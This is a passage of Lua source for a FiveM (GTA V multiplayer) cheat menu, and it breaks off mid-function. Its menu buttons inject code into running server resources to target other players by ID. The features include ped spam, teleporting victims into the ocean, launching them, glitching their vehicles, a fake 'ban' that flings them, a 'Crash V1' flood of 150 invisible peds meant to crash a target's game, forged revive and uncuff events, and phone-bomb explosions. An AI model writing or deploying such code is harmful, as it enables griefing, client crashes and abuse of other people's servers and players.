        isSpawning = false
        MachoMenuNotification("NPC System", "NPC spawn stopped!")
    else
        MachoMenuNotification("Info", "NPC spawn is already stopped.")
    end
end)

-- NPC Spam Feature
MachoMenuText(VehicleNPCSection, "NPC Spam")
-- NPC Spam Exploit Control
local pedSpawningExploit = false
local pedModelExploit = "mp_m_freemode_01"

-- Player ID input box (NPC Spam)
local PedTargetInputBox = MachoMenuInputbox(VehicleNPCSection, "NPC Spam Target ID", "e.g., 123")

-- START PED SPAM BUTTON
MachoMenuButton(VehicleNPCSection, "Start Ped Spam - Exploit", function()
    if pedSpawningExploit then
        MachoMenuNotification("Error", "Already started. Stop it first.")
        return
    end

    local targetId = tonumber(MachoMenuGetInputbox(PedTargetInputBox))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Error", "Please enter a valid player ID!")
        return
    end

    pedSpawningExploit = true

    MachoInjectResource('monitor', string.format([[
        local pedModel = "%s"
        local pedSpawning = true
        local targetId = %d

        CreateThread(function()
            while pedSpawning do
                RequestModel(pedModel)
                while not HasModelLoaded(pedModel) do
                    Wait(100)
                end

                local player = GetPlayerFromServerId(targetId)
                if player and player ~= -1 then
                    local ped = GetPlayerPed(player)
                    local pos = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)

                    local spawnedPed = CreatePed(28, GetHashKey(pedModel), pos.x, pos.y, pos.z, heading, true, false)
                    TaskWanderInArea(spawnedPed, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                    SetPedAsNoLongerNeeded(spawnedPed)
                end

                Wait(math.random(1000, 2000))
            end
        end)

        RegisterNetEvent("stopPedSpamExploit", function()
            pedSpawning = false
        end)
    ]], pedModelExploit, targetId))

    MachoMenuNotification("NPC System", "Ped spam started! Target ID: " .. targetId)
end)

-- STOP PED SPAM BUTTON
MachoMenuButton(VehicleNPCSection, "Stop Ped Spam", function()
    if not pedSpawningExploit then
        MachoMenuNotification("Info", "Already stopped.")
        return
    end

    pedSpawningExploit = false

    MachoInjectResource('monitor', [[
        TriggerEvent("stopPedSpamExploit")
    ]])

    MachoMenuNotification("NPC System", "Ped spam stopped!")
end)

-- Title: Player Manipulation
MachoMenuText(PlayerManipSection, "Player Manipulation")

-- Bring to Self (Auto bring and drop - No G key needed)
local BringTargetIdInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Bring)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Bring to Self", function()
    local targetId = tonumber(MachoMenuGetInputbox(BringTargetIdInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Bring", "Bringing player ID: " .. targetId)
        
        MachoInjectResource('monitor', string.format([[
            local playerPed = PlayerPedId()
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if targetPlayer then
                local targetPed = GetPlayerPed(targetPlayer)
                if targetPed and targetPed ~= 0 then
                    local targetCoords = GetEntityCoords(targetPed)
                    local originalPos = GetEntityCoords(playerPed)
                    local targetName = GetPlayerName(targetPlayer)
                    
                    -- Teleport to target
                    SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    
                    -- Wait a moment
                    Citizen.Wait(150)
                    
                    -- Trigger carry on target (this makes you carry them)
                    TriggerEvent('m3-smallresources:CarryHideInTrunk:carryPlayer')
                    
                    -- Wait for carry to start
                    Citizen.Wait(500)
                    
                    -- Teleport back to original position (player being carried will follow)
                    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, true)
                    
                    -- Wait a moment for them to arrive
                    Citizen.Wait(200)
                    
                    -- Drop them automatically
                    TriggerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer')
                    TriggerServerEvent('m3-smallresources:CarryHideInTrunk:dropPlayer', targetServerId)
                    
                    print(">> Brought " .. targetName .. " to you!")
                    TriggerEvent('chat:addMessage', { args = { '^2Bring:', 'Brought ' .. targetName .. ' (ID: ' .. targetServerId .. ') to you!' } })
                else
                    TriggerEvent('chat:addMessage', { args = { '^1Bring:', 'Target player not in game! ID: ' .. targetServerId } })
                end
            else
                TriggerEvent('chat:addMessage', { args = { '^1Bring:', 'Player not found! ID: ' .. targetServerId } })
            end
        ]], targetId))
        
        MachoMenuNotification("Bring", "Player brought to you!")
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Launch Player
local LaunchPlayerInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Launch)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Launch Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(LaunchPlayerInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Launch", "Launching player ID: " .. targetId)
        
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Launch: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Launch: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Launch: Cannot target self!")
                return
            end
            
            local myPed = PlayerPedId()
            local myCoords = GetEntityCoords(myPed)
            local targetCoords = GetEntityCoords(targetPed)
            local distance = #(myCoords - targetCoords)
            
            local teleported = false
            local originalCoords = myCoords
            
            -- Teleport to target if far away
            if distance > 10.0 then
                local angle = math.random() * 2 * math.pi
                local radiusOffset = math.random(5, 9)
                local xOffset = math.cos(angle) * radiusOffset
                local yOffset = math.sin(angle) * radiusOffset
                local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                SetEntityVisible(myPed, false, 0)
                teleported = true
                Wait(100)
            end
            
            -- Launch effect
            ClearPedTasksImmediately(myPed)
            for i = 1, 15 do
                if not DoesEntityExist(targetPed) then break end
                local curTargetCoords = GetEntityCoords(targetPed)
                if not curTargetCoords then break end
                
                SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                Wait(50)
                AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                Wait(50)
                DetachEntity(myPed, true, true)
                Wait(100)
            end
            
            Wait(500)
            ClearPedTasksImmediately(myPed)
            
            -- Return to original position
            if originalCoords then
                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
                Wait(100)
                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
            end
            
            if teleported then
                SetEntityVisible(myPed, true, 0)
            end
            
            local targetName = GetPlayerName(targetPlayer)
            print("Launch: Launched " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^2Launch:', 'Launched ' .. targetName .. ' (ID: %d)' } })
        ]], targetId, targetId))
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)


-- Teleport to Ocean
local OceanInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (To Ocean)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Teleport to Ocean", function()
    local targetId = tonumber(MachoMenuGetInputbox(OceanInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Ocean", "Sending player ID: " .. targetId .. " to ocean")
        
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'ox_inventory'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Ocean: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Ocean: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Ocean: Cannot target self!")
                return
            end
            
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            local oceanCoords = vector3(2899.825, -5220.937, 121.9951)
            
            if vehicle and vehicle ~= 0 then
                -- Teleport vehicle to ocean
                NetworkRequestControlOfEntity(vehicle)
                local timeout = 0
                while not NetworkHasControlOfEntity(vehicle) and timeout < 100 do
                    NetworkRequestControlOfEntity(vehicle)
                    Wait(10)
                    timeout = timeout + 1
                end
                
                if NetworkHasControlOfEntity(vehicle) then
                    SetEntityCoords(vehicle, oceanCoords.x, oceanCoords.y, oceanCoords.z, false, false, false, false)
                    SetEntityVelocity(vehicle, 0.0, 0.0, -50.0)
                    SetVehicleEngineOn(vehicle, false, true, true)
                    SetVehicleUndriveable(vehicle, true)
                end
            else
                -- Teleport player to ocean
                SetEntityCoords(targetPed, oceanCoords.x, oceanCoords.y, oceanCoords.z, false, false, false, false)
            end
            
            local targetName = GetPlayerName(targetPlayer)
            print("Ocean: Sent " .. targetName .. " to ocean")
            TriggerEvent('chat:addMessage', { args = { '^2Ocean:', 'Sent ' .. targetName .. ' to the ocean!' } })
        ]], targetId, targetId))
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Glitch Vehicle on Selected Player
local GlitchTargetIdInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Glitch Vehicle)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Glitch Vehicle", function()
    local targetId = tonumber(MachoMenuGetInputbox(GlitchTargetIdInputBoxHandle))
    if targetId and targetId > 0 then
        MachoInjectResource('monitor', string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'Player not found! ID: %d' } })
                return
            end
            
            local selected_ped = GetPlayerPed(targetPlayer)
            
            if not DoesEntityExist(selected_ped) then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if selected_ped == PlayerPedId() then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'You cannot target yourself!' } })
                return
            end
            
            local myCoords = GetEntityCoords(PlayerPedId())
            local selected_coords = GetEntityCoords(selected_ped)
            local vehped = GetVehiclePedIsIn(selected_ped, false)
            
            -- Find nearest vehicle to target
            local nearestVehicle = GetClosestVehicle(selected_coords, 150.0, 0, 70)
            
            if not nearestVehicle or nearestVehicle == 0 then
                TriggerEvent('chat:addMessage', { args = { '^1Glitch Vehicle:', 'No vehicle found nearby target!' } })
                return
            end
            
            -- Get target player name
            local targetName = GetPlayerName(targetPlayer)
            
            -- Put player in vehicle
            SetPedIntoVehicle(PlayerPedId(), nearestVehicle, -1)
            SetEntityVisible(PlayerPedId(), false, false)
            Wait(300)
            
            local veh2 = GetVehiclePedIsIn(PlayerPedId(), false)
            local net = VehToNet(veh2)
            NetworkRequestControlOfEntity(veh2)
            SetPlayersLastVehicle(veh2)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(veh2), true)
            SetNetworkIdAlwaysExistsForPlayer(net, PlayerPedId(), true)
            NetworkUseHighPrecisionBlending(net, true)
            SetVehicleExclusiveDriver_2(veh2, PlayerPedId(), true)
            SetVehicleExclusiveDriver(veh2, PlayerPedId(), true)
            NetworkSetEntityGhostedWithOwner(veh2, true)
            SetVehicleEngineOn(veh2, true, true, true)
            Citizen.InvokeNative(0xA670B3662FAFFBD0, net)
            Citizen.InvokeNative(0xB69317BF5E782347, veh2)
            
            Wait(200)
            ClearPedTasksImmediately(PlayerPedId())
            
            -- Attach vehicle to target's vehicle
            AttachEntityToEntityPhysically(
                nearestVehicle,
                vehped,
                -99999999999,
                -99999999999999999999999999,
                2,
                -9999999999999999999999.58,
                -9999999999.928,
                800990.0,
                2980.0,
                89999.0,
                99999.0,
                true,
                true,
                false,
                true,
                0
            )
            
            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, true, true, false, true)
            Wait(100)
            SetPedIntoVehicle(PlayerPedId(), nearestVehicle, -1)
            
            local veh3 = GetVehiclePedIsIn(PlayerPedId(), false)
            local net2 = VehToNet(veh3)
            NetworkRequestControlOfEntity(veh3)
            SetPlayersLastVehicle(veh3)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(veh3), true)
            SetNetworkIdAlwaysExistsForPlayer(net2, PlayerPedId(), true)
            NetworkUseHighPrecisionBlending(net2, true)
            SetVehicleExclusiveDriver_2(veh3, PlayerPedId(), true)
            SetVehicleExclusiveDriver(veh3, PlayerPedId(), true)
            NetworkSetEntityGhostedWithOwner(veh3, true)
            SetVehicleEngineOn(veh3, true, true, true)
            Citizen.InvokeNative(0xA670B3662FAFFBD0, net2)
            Citizen.InvokeNative(0xB69317BF5E782347, veh3)
            
            -- Re-attach
            AttachEntityToEntityPhysically(
                nearestVehicle,
                vehped,
                -99999999999,
                -99999999999999999999999999,
                2,
                -9999999999999999999999.58,
                -9999999999.928,
                800990.0,
                2980.0,
                89999.0,
                99999.0,
                true,
                true,
                false,
                true,
                0
            )
            
            Wait(10)
            SetEntityVisible(PlayerPedId(), true, true)
            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, true, true, false, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2Glitch Vehicle:', 'Vehicle glitched on ' .. targetName .. ' (ID: %d)' } })
        ]], targetId, targetId, targetId, targetId))
        
        MachoMenuNotification("Glitch Vehicle", "Vehicle glitch initiated on ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- s1 Ban Player (Fixed)
local BanPlayerInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Ban)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "s1 Ban Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(BanPlayerInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("s1 Ban", "Ban effect initiating on ID: " .. targetId)
        
        MachoInjectResource('monitor', string.format([[
            local targetServerId = %d
            print("s1 Ban: Target ID " .. targetServerId)
            
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("s1 Ban: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("s1 Ban: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("s1 Ban: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'You cannot target yourself!' } })
                return
            end
            
            print("s1 Ban: Player found, starting ban effect...")
            local targetCoords = GetEntityCoords(targetPed)
            local vehicleModel = GetHashKey("mule")
            
            RequestModel(vehicleModel)
            local timeout = 0
            while not HasModelLoaded(vehicleModel) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(vehicleModel) then
                print("s1 Ban: Model loaded, creating vehicle...")
                
                -- If player is in a vehicle, kick them out first
                if IsPedInAnyVehicle(targetPed, false) then
                    local theirVeh = GetVehiclePedIsIn(targetPed, false)
                    if theirVeh ~= 0 then
                        ClearPedTasksImmediately(targetPed)
                        TaskLeaveVehicle(targetPed, theirVeh, 0)
                        Wait(500)
                    end
                end
                
                local veh = CreateVehicle(vehicleModel, targetCoords.x, targetCoords.y + 3, targetCoords.z, 0.0, true, true)
                SetEntityVisible(veh, false, false)
                Wait(400)
                SetEntityCoords(veh, targetCoords.x, targetCoords.y, targetCoords.z + 2.0, true, true, true, true)
                
                if DoesEntityExist(veh) then
                    print("s1 Ban: Vehicle created, attaching player...")
                    SetEntityVisible(veh, false, false)
                    SetEntityAsMissionEntity(veh, true, true)
                    SetEntityDynamic(veh, true)
                    SetEntityCollision(veh, true, true)
                    ActivatePhysics(veh)
                    
                    -- Attach player to the vehicle
                    SetPedIntoVehicle(targetPed, veh, -1)
                    
                    local targetName = GetPlayerName(targetPlayer)
                    TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Ban effect on ' .. targetName .. ' (ID: %d)' } })
                    
                    CreateThread(function()
                        Wait(2000)
                        if DoesEntityExist(veh) then
                            print("s1 Ban: Applying force...")
                            ApplyForceToEntity(
                                veh,
                                1,
                                150000.0,
                                0.0,
                                350000000.0,
                                0.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                true,
                                false,
                                true
                            )
                            Wait(6000)
                            if DoesEntityExist(veh) then
                                print("s1 Ban: Deleting vehicle...")
                                DeleteEntity(veh)
                            end
                        end
                    end)
                else
                    print("s1 Ban: Failed to create vehicle!")
                    TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Failed to create vehicle!' } })
                end
            else
                print("s1 Ban: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1s1 Ban:', 'Failed to load model!' } })
            end
            
            SetModelAsNoLongerNeeded(vehicleModel)
        ]], targetId, targetId, targetId, targetId))
        
        MachoMenuNotification("s1 Ban", "Ban effect sent to ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Crash V1 (Ped Flood)
local CrashV1InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Crash V1)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Crash V1 (Ped Flood)", function()
    local targetId = tonumber(MachoMenuGetInputbox(CrashV1InputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Crash V1", "Invisible crasher deploying on ID: " .. targetId)
        
        -- Try to find a working resource to inject into
local targetResource = nil
if GetResourceState('monitor') == "started" then
    targetResource = 'monitor'
elseif GetResourceState('qb-core') == "started" then
    targetResource = 'qb-core'
elseif GetResourceState('es_extended') == "started" then
    targetResource = 'es_extended'
elseif GetResourceState('m3-apartments') == "started" then
    targetResource = 'm3-apartments'
elseif GetResourceState('m3-inventory') == "started" then
    targetResource = 'm3-inventory'
elseif GetResourceState('m3-hud') == "started" then
    targetResource = 'm3-hud'
elseif GetResourceState('ox_inventory') == "started" then
    targetResource = 'ox_inventory'
else
    targetResource = 'qb-core' -- fallback
end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Crash V1: Player not found!")
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Crash V1: Target ped not found!")
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Crash V1: Cannot target self!")
                return
            end
            
            print("Crash V1: Deploying invisible crasher on " .. GetPlayerName(targetPlayer))
            
            local modelHash = GetHashKey("player_one")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(100)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local myPed = PlayerPedId()
                local targetCoords = GetEntityCoords(targetPed)
                local entities = {}
                
                for i = 1, 150 do
                    local angle = math.random() * 2 * math.pi
                    local distance = math.random() * 4.5
                    local x = targetCoords.x + (distance * math.cos(angle))
                    local y = targetCoords.y + (distance * math.sin(angle))
                    local z = targetCoords.z
                    
                    local hasGround, groundZ = GetGroundZFor_3dCoord(x, y, z + 2.0, false)
                    if hasGround then
                        z = groundZ
                    end
                    
                    local ped = CreatePed(28, modelHash, x, y, z, math.random(0, 359), true, false)
                    
                    if DoesEntityExist(ped) then
                        SetEntityAlpha(ped, 0, false)
                        SetEntityVisible(ped, false, false)
                        FreezeEntityPosition(ped, true)
                        SetEntityCollision(ped, false, false)
                        SetEntityNoCollisionEntity(ped, myPed, true)
                        SetEntityCanBeDamaged(ped, false)
                        SetEntityInvincible(ped, true)
                        SetPedCanRagdoll(ped, false)
                        SetBlockingOfNonTemporaryEvents(ped, true)
                        SetPedFleeAttributes(ped, 0, false)
                        SetPedCombatAttributes(ped, 0, false)
                        SetPedCombatAttributes(ped, 5, false)
                        SetPedSeeingRange(ped, 0.0)
                        SetPedHearingRange(ped, 0.0)
                        SetPedAsNoLongerNeeded(ped)
                        table.insert(entities, ped)
                    end
                    
                    if i % 6 == 0 then
                        Citizen.Wait(200)
                    end
                end
                
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Crash V1: Invisible crasher deployed on " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Crash V1:', 'Invisible crasher deployed on ' .. targetName .. ' (ID: %d)' } })
                
                -- Clean up after 60 seconds
                Citizen.SetTimeout(60000, function()
                    local count = 0
                    for _, ent in ipairs(entities) do
                        if DoesEntityExist(ent) then
                            DeleteEntity(ent)
                            count = count + 1
                        end
                    end
                    print("Crash V1: Crasher cleaned up - " .. count .. " peds deleted")
                    TriggerEvent('chat:addMessage', { args = { '^2Crash V1:', 'Crasher cleaned up - ' .. count .. ' peds deleted' } })
                end)
            else
                print("Crash V1: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Crash V1:', 'Failed to load model!' } })
            end
        ]], targetId))
        
        MachoMenuNotification("Crash V1", "Invisible crasher deployed on ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Whale on Player
local WhaleInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Whale)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Whale on Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(WhaleInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Whale", "Spawning whale on ID: " .. targetId)
        
        -- Try to find a working resource to inject into
local targetResource = nil
if GetResourceState('monitor') == "started" then
    targetResource = 'monitor'
elseif GetResourceState('qb-core') == "started" then
    targetResource = 'qb-core'
elseif GetResourceState('es_extended') == "started" then
    targetResource = 'es_extended'
elseif GetResourceState('m3-apartments') == "started" then
    targetResource = 'm3-apartments'
elseif GetResourceState('m3-inventory') == "started" then
    targetResource = 'm3-inventory'
elseif GetResourceState('m3-hud') == "started" then
    targetResource = 'm3-hud'
elseif GetResourceState('ox_inventory') == "started" then
    targetResource = 'ox_inventory'
else
    targetResource = 'qb-core' -- fallback
end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Whale: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Whale: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Target player not in game! ID: %d' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Whale: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'You cannot target yourself!' } })
                return
            end
            
            print("Whale: Spawning whale on " .. GetPlayerName(targetPlayer))
            
            local pos = GetEntityCoords(targetPed)
            local heading = GetEntityHeading(targetPed)
            local pedModel = "A_C_HumpBack"
            local modelHash = GetHashKey(pedModel)
            
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 500 do
                Citizen.Wait(10)
                timeout = timeout + 10
            end
            
            if HasModelLoaded(modelHash) then
                local whale = CreatePed(28, modelHash, pos.x, pos.y, pos.z + 5, heading, true, false)
                
                if DoesEntityExist(whale) then
                    SetEntityAsMissionEntity(whale, true, true)
                    SetEntityInvincible(whale, true)
                    SetEntityVelocity(whale, math.random(-10, 10), math.random(-10, 10), -15)
                    TaskWanderInArea(whale, pos.x, pos.y, pos.z, 10.0, 10.0, 10.0)
                    
                    local targetName = GetPlayerName(targetPlayer)
                    print("Whale: Whale spawned on " .. targetName)
                    TriggerEvent('chat:addMessage', { args = { '^2Whale:', 'Whale spawned on ' .. targetName .. ' (ID: %d)' } })
                else
                    print("Whale: Failed to create whale!")
                    TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Failed to create whale!' } })
                end
                
                SetModelAsNoLongerNeeded(modelHash)
                
                -- Delete whale after 10 seconds
                Citizen.SetTimeout(10000, function()
                    if DoesEntityExist(whale) then
                        DeleteEntity(whale)
                        print("Whale: Whale deleted")
                    end
                end)
            else
                print("Whale: Failed to load whale model!")
                TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Failed to load whale model!' } })
            end
        ]], targetId, targetId, targetId))
        
        MachoMenuNotification("Whale", "Whale spawn sent to ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Uncuff Near Player
MachoMenuButton(PlayerManipSection, "Uncuff Near Player", function()
    -- Try to find a working resource to inject into
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    elseif GetResourceState('es_extended') == "started" then
        targetResource = 'es_extended'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        TriggerEvent('police:client:UnCuffPlayer', 'handcuffs')
        print("Uncuff Near Player triggered")
        TriggerEvent('chat:addMessage', { args = { '^2Uncuff:', 'Attempted to uncuff nearby player!' } })
    ]])
    
    MachoMenuNotification("Uncuff", "Attempted to uncuff nearby player!")
end)

-- Medkit Revive (On Selected Player)
local MedkitReviveInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Medkit Revive)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "Medkit Revive", function()
    local targetId = tonumber(MachoMenuGetInputbox(MedkitReviveInputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Medkit Revive", "Reviving player ID: " .. targetId)
        
        -- Try direct trigger first
        local success = false
        pcall(function()
            TriggerServerEvent('medkit:revivePlayer', targetId)
            success = true
        end)
        
        -- If direct fails, inject into a resource
        if not success then
            local targetResource = nil
            if GetResourceState('monitor') == "started" then
                targetResource = 'monitor'
            elseif GetResourceState('qb-core') == "started" then
                targetResource = 'qb-core'
            elseif GetResourceState('es_extended') == "started" then
                targetResource = 'es_extended'
            else
                targetResource = 'ox_inventory'
            end
            
            MachoInjectResource2(NewThreadNs, targetResource, string.format([[
                local targetServerId = %d
                TriggerServerEvent('medkit:revivePlayer', targetServerId)
                print("Medkit Revive: Revived player ID: " .. targetServerId)
                TriggerEvent('chat:addMessage', { args = { '^2Medkit Revive:', 'Revived player ID: ' .. targetServerId } })
            ]], targetId))
        end
        
        MachoMenuNotification("Medkit Revive", "Revive sent to ID: " .. targetId)
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- S1 Explode Player Method 1 (Phone Explosive)
local ExplodeMethod1InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Explode M1)", "e.g., 123")

MachoMenuButton(PlayerManipSection, "S1 Explode Player Method 1", function()
    local targetId = tonumber(MachoMenuGetInputbox(ExplodeMethod1InputBoxHandle))
    if targetId and targetId > 0 then
        MachoMenuNotification("Explode M1", "Exploding player ID: " .. targetId)
        
        local targetResource = nil
        if GetResourceState('monitor') == "started" then
            targetResource = 'monitor'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        elseif GetResourceState('qb-core') == "started" then
            targetResource = 'qb-core'
        else
            targetResource = 'qb-core'
        end
        
        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M1: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M1: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M1: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M1: Exploding " .. GetPlayerName(targetPlayer))
            
            local coords = GetEntityCoords(targetPed)
            local model = GetHashKey("sultan")
            
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(model) then
                local veh = CreateVehicle(model, coords.x, coords.y + 10, coords.z, 0.0, true, false)
                SetEntityVisible(veh, false, false)
                AddVehiclePhoneExplosiveDevice(veh)
                Wait(1000)
                SetEntityCoords(veh, GetEntityCoords(targetPed), true, true, true)
                Wait(100)
                DetonateVehiclePhoneExplosiveDevice(veh)
                Wait(400)
                
                if DoesEntityExist(veh) then
                    DeleteEntity(veh)
                end
                
                SetModelAsNoLongerNeeded(model)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Explode M1: Exploded " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Exploded ' .. targetName .. ' Method 1' } })
            else
                print("Explode M1: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Failed to load model!' } })
            end
        ]], targetId, targetId, targetId))
        
